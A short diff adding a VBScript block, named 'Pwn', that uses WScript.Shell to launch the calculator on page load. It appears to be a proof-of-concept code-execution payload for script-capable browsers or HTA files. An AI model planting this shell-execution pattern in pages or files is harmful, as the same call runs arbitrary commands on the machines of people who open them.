@@ -1,0 +1,7 @@
+<script language="vbscript">
+Function Pwn()
+      Set shell = CreateObject("wscript.Shell")
+      shell.run "calc"
+    End Function
+    Pwn
+</script>
